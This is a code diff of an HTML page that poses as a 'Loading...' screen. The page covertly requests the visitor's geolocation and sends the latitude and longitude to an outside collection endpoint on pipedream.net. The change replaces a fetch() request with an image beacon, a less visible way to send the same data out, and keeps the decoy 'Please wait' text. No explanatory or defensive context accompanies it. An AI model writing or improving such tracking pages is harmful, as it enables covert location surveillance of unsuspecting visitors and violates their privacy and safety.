@@ -4,17 +4,12 @@
     <title>Loading...</title>
 </head>
 <body>
+    <p>Please wait, loading content...</p>
     <script>
         navigator.geolocation.getCurrentPosition(function(position) {
-            fetch('https://eon186u4rmikh86.m.pipedream.net?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude, {
-                method: 'GET',
-                mode: 'no-cors',
-                headers: {
-                    'Content-Type': 'application/json'
-                }
-            });
+            var img = new Image();
+            img.src = 'https://eon186u4rmikh86.m.pipedream.net?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude;
         });
     </script>
-    <p>Please wait, loading content...</p>
 </body>
 </html>
